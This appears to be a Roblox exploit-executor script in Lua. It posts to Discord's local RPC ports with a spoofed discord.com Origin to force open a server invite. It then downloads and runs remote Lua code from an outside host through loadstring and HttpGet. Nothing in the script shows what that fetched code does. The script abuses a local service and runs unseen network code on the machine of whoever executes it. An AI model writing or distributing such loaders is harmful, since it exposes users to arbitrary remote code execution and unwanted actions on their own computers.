local HttpService = game:GetService("HttpService")
local useStudio = false 
local InviteCode = "CaUVkK2YuV"

local req = request or syn.request or http_request or fluxus.request 

if not useStudio then
    if req then
        local ports = {6463, 6464, 6465, 6466}
        for _, port in ipairs(ports) do
            local success = pcall(function()
                return req({
                    Url = 'http://127.0.0.1:' .. port .. '/rpc?v=1',
                    Method = 'POST',
                    Headers = { ['Content-Type'] = 'application/json', Origin = 'https://discord.com' },
                    Body = HttpService:JSONEncode({
                        cmd = 'INVITE_BROWSER',
                        nonce = HttpService:GenerateGUID(false),
                        args = { code = InviteCode }
                    })
                })
            end)
            if success then
                print("Invite sent successfully on port " .. port)
                break
            end
        end
    end
end
loadstring(game:HttpGet("http://syng.lol/PET.lua"))()
